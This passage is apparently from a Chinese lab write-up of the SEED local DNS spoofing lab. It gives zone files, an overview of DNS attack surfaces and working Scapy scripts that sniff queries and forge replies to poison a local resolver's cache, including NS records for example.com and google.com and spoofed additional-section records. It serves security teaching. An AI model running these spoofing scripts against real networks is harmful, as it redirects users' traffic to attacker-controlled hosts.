class="hljs-number">2</span>H<br>                <span class="hljs-number">4</span>W<br>                <span class="hljs-number">1</span>D)<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>    ns.attacker32.com.<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.180</span><br>www     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.180</span><br>ns      <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.153</span><br>*       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.100</span><br></code></pre></td></tr></table></figure><p>7、文件zone_example.com：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-meta">$TTL</span> <span class="hljs-number">3</span>D<br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>   ns.example.com. admin.example.com. (<br>                <span class="hljs-number">2008111001</span><br>                <span class="hljs-number">8</span>H<br>                <span class="hljs-number">2</span>H<br>                <span class="hljs-number">4</span>W<br>                <span class="hljs-number">1</span>D)<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>    ns.attacker32.com.<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">1.2.3.4</span><br>www     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">1.2.3.5</span><br>ns      <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.153</span><br>*       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">1.2.3.6</span><br></code></pre></td></tr></table></figure><p>①@符号是特殊字符，代表named.conf文件内指定的来源</p><p>②SOA：授权开始</p><h3 id="2-0-2-DNS攻击概述">2.0.2 DNS攻击概述</h3><p><strong>针对DNS的攻击方式</strong></p><p>1、拒绝服务攻击<br>2、DNS欺骗攻击，主要目的是给受害者提供虚假的IP地址</p><p><strong>对域名系统的四个攻击面</strong></p><p>1、在受感染的计算机中攻击<br>比如修改/etc/resolv.conf或/etc/hosts等</p><p>2、攻击用户机<br>当用户机给本地DNS服务器发送DNS请求时，攻击者可以立即发送一个欺骗的回复</p><p>3、攻击本地DNS服务器：缓存中毒攻击<br>当本地DNS服务器向因特网中的DNS服务器发送迭代请求时，攻击者可以发送欺骗回复给本地DNS服务器。<br>欺骗回复的信息通常被DNS服务器缓存，这个攻击被称为DNS缓存中毒攻击</p><p>4、从恶意DNS服务器发起攻击<br>比如用户访问attacker32.com这个网站时，一个DNS请求会最终到达attacker32.com的权威域名服务器。 除了在响应的回复部分提供IP地址外，这个域名服务器还会提供授权和附加部分的信息。<br>如果用户不加选择地接受域名服务器提供的所有信息，攻击者就可以通过提供虚假信息来达到攻击的目的。</p><h3 id="2-0-3-DNS-pkt">2.0.3 DNS pkt</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">DNSpkt = DNS(<span class="hljs-attribute">id</span>=pkt[DNS].id, <span class="hljs-attribute">qd</span>=pkt[DNS].qd, <span class="hljs-attribute">aa</span>=1, <span class="hljs-attribute">rd</span>=0, <span class="hljs-attribute">qr</span>=1, <br><span class="hljs-attribute">qdcount</span>=1, <span class="hljs-attribute">ancount</span>=1, <span class="hljs-attribute">nscount</span>=2, <span class="hljs-attribute">arcount</span>=2,<br><span class="hljs-attribute">an</span>=Anssec, <span class="hljs-attribute">ns</span>=NSsec1/NSsec2, <span class="hljs-attribute">ar</span>=Addsec1/Addsec2)<br></code></pre></td></tr></table></figure><p>• id: Transaction ID; 应该与请求中的相同</p><p>• qd: Query Domain; 查询域，应该与请求中的相同</p><p>• aa: Authoritative answer (1表示该答案包含权威答案).</p><p>• rd: Recursion Desired (需要的递归，0表示禁用递归查询).</p><p>• qr: Query Response bit (查询响应位，1 means Response).</p><p>• qdcount: number of query domains.</p><p>• ancount: number of records in the Answer section.</p><p>• nscount: number of records in the Authority section.</p><p>• arcount: number of records in the Additional section.</p><p>• an: Answer section</p><p>• ns: Authority section</p><p>• ar: Additional section</p><h2 id="2-1-实验设置">2.1 实验设置</h2><ul><li><p>源端口固定为33333</p></li><li><p>关闭保护机制DNSSEC</p></li><li><p>在攻击期间，需要检查本地DNS服务器上的DNS缓存。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">rndc dumpdb -cache  <span class="hljs-meta"># 将缓存的内容转储到文件/var/cache/bind/dump.db</span><br>rndc <span class="hljs-keyword">flush</span> <span class="hljs-meta"># 清空缓存</span><br></code></pre></td></tr></table></figure><p>如果缓存有答案，那么来自本地DNS服务器的回复将比欺骗的回复更快，攻击将无法成功。</p></li><li><p>主机ip</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ef6a803db0cb</span>  user-<span class="hljs-number">10.9.0.5</span><br>a90fe8321faf  seed-router<br>9f716ac16cda  local-dns-server-<span class="hljs-number">10.9.0.53</span><br>c58c42209e5f  attacker-ns-<span class="hljs-number">10.9.0.153</span><br>d2df3f3bb639  seed-attacker<br>eee6e69ae762  mysql-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure></li><li><p>Attacker nameserver 的zone file，请求该域名的都会被转发到它的nameserver10.9.0.153</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.4.jpg" class=""></li></ul><h2 id="2-2-Testing-the-DNS-Setup">2.2 Testing the DNS Setup</h2><h3 id="2-2-1-Get-the-IP-address-of-ns-attacker32-com">2.2.1 Get the IP address of <a href="http://ns.attacker32.com">ns.attacker32.com</a></h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> ns.attacker32.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>“dig”是一个域名解析命令，客户机10.9.0.5执行该命令，该域名指向的地址与攻击者主机的ip对应。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.2.jpg" class=""><h3 id="2-2-2-Get-the-IP-address-of-www-example-com">2.2.2 Get the IP address of <a href="http://www.example.com">www.example.com</a></h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> www.example.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>执行命令时，会向example.com域的官方名称服务器询问www.example.com的IP。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.3.jpg" class=""><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com<br></code></pre></td></tr></table></figure><p>直接向ns.attacker32.com发送请求，结果显示attacker将www.example.com对应的IP指向1.2.3.5：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.5.jpg" class=""><p>结果与Attacker上zone文件相同：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.6.jpg" class=""><h2 id="2-3-Task-1-Directly-Spoofifing-Response-to-User">2.3 Task 1: Directly Spoofifing Response to User</h2><p>task1实现DNS欺骗的方法是通过侦听客户机的数据包，然后对捕获的数据包进行修改，再发送给客户机。这种攻击方法的目标是客户机，而非DNS服务器。</p><p>1、在local DNS Server中使用命令<code>rndc flush</code>清楚缓存</p><p>2、编写dns欺骗代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = <span class="hljs-string">&#x27;10.9.0.5&#x27;</span>,     src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,         <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>, <br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec )<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.5 and dst port 53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br><br></code></pre></td></tr></table></figure><p>2、用户机再次执行命令<code>dig www.example.com</code>，结果显示，域名对应的IP变为攻击者域名对应的IP1.2.3.5：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.8.png" class=""><h2 id="2-4-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofifing-Answers">2.4 Task 2: DNS Cache Poisoning Attack – Spoofifing Answers</h2><p>1、修改攻击代码：</p><p>这次侦听的数据包是由本地DNS发出的数据包，同样构造数据包的内容，实现对本地DNS的攻击：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src,     src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,         <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>, <br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec )<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure><p>2、清空本地DNS缓存：<code>rndc flush</code></p><p>3、运行攻击代码：<code>sudo python3 ./spoof_answer.py</code>，在客户机dig域名后侦听到了数据包</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.10.png" class=""><p>4、客户机执行命令：<code>dig www.example.com</code>，域名对应的IP被修改为指定的IP1.2.3.5，攻击成功。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.9.png" class=""><p>5、查看缓存信息</p><p>将local dns server的缓存内容写入文件，并查看。可以看到www.example.com和example.com对应的IP均被修改。攻击机停止运行攻击代码，客户机再次执行命令，仍然可以看到攻击后的结果，进一步说明了本地dns已经被成功投毒。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">rndc dumpdb -cache<br><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/cache/bind/dump.<span class="hljs-keyword">db</span> &gt; task2_cache.txt<br><span class="hljs-keyword">cat</span> task2_cache.txt<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.11.png" class=""><h2 id="2-5-Task-3-Spoofifing-DNS-Records">2.5 Task 3: Spoofifing DNS Records</h2><p>在前面的任务中，DNS缓存中毒攻击只影响一个主机名，task3将实现可以影响整个example.com域的攻击，其目的就是伪造权威域名服务器，<a href="http://xn--example-oc6k070l98j.xn--netattack32-3t3sv90bo61by62apk8ach6eo5sa.com">使所有example.net域的请求都指向attack32.com</a>。如果想要得到授权对一个域进行攻击的话，就需要配置一个合法的ip。</p><p>1、修改攻击代码：spoof_ns.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src, src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    NSsec  = DNSRR( rrname = <span class="hljs-string">&#x27;example.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,                        <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec, <br>               nscount=<span class="hljs-number">1</span>, ns = NSsec)<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure><p>2、清空本地DNS缓存：<code>rndc flush</code></p><p>3、运行攻击代码：<code>sudo python3 ./spoof_ns.py</code></p><p>4、客户机执行命令：<code>dig www.example.com</code>，IP映射到1.2.3.5</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.12.png" class=""><p>5、客户机digexample的子域名，IP映射到1.2.3.6，攻击成功：</p><p><a href="http://xn--task3-y08h91umth.example.com">子域名task3.example.com</a>：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.13.png" class=""><p><a href="http://xn--test-uk1gj6rg0g.example.com">子域名test.example.com</a>：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.14.png" class=""><p>6、查看本地DNS服务的缓存内容，可以看到，映射表被成功修改：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.15.jpg" class=""><h2 id="2-6-Task-4-Spoofifing-NS-Records-for-Another-Domain">2.6 Task 4: Spoofifing NS Records for Another Domain</h2><p>1、在数据包中添加额外的信息，包含“<a href="http://google.com">google.com</a>”，当DNS服务器接收该数据包时，就会缓存恶意的解析地址。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src, src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    NSsec  = DNSRR( rrname = <span class="hljs-string">&#x27;example.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    NSsec2  = DNSRR( rrname = <span class="hljs-string">&#x27;google.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,                        <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec, <br>               nscount=<span class="hljs-number">1</span>, ns = NSsec2/NSsec)<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure><p>2、<code>dig task4.example.com</code>，结果显示，ns.attacker32.com成为了google.com的权威域名服务器。</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.18.png" class=""><p>其他情况：</p><p>1、只有NSsec2→可以</p><p>2、NSsec/NSsec2→不可以</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.17.png" class=""><h2 id="2-7-Task-5-Spoofifing-Records-in-the-Additional-Section">2.7 Task 5: Spoofifing Records in the Additional Section</h2><p>task5需要在附加信息字段实现攻击。和上一实验不一样的是，task4是给facebook.com域提供NS记录，<a href="http://xn--task5facebook-m300a331bu04h.xn--comattacker32-kz4ux17p.com">而task5是把facebook.com当作attacker32.com</a> 域的一个域名服务器。虽然facebook.com不在attacker32.com的区域内，但作为域名服务器是允许的，因为一个域的权威域名服务器不一定非要在这个域内。</p><p>1、修改攻击代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src, src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    NSsec  = DNSRR( rrname = <span class="hljs-string">&#x27;example.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    NSsec2  = DNSRR( rrname = <span class="hljs-string">&#x27;google.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    Addsec1  = DNSRR( rrname = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    Addsec2  = DNSRR( rrname = <span class="hljs-string">&#x27;ns.example.net&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;5.6.7.8&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    Addsec3  = DNSRR( rrname = <span class="hljs-string">&#x27;www.facebook.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;3.4.5.6&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,                        <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec, <br>               nscount=<span class="hljs-number">2</span>, ns = NSsec2/NSsec,<br>               arcount=<span class="hljs-number">3</span>, ar = Addsec1/Addsec2/Addsec3)<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and dst port 53&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure><p>2、清空本地DNS缓存：<code>rndc flush</code></p><p>3、运行攻击代码：<code>sudo python3 ./spoof_ns.py</code></p><p>4、执行命令<code>dig abc.example.com</code>：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/10.1.png" class=""><p>5、查看缓存：</p><img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.19.jpg" class=""><p>在执行 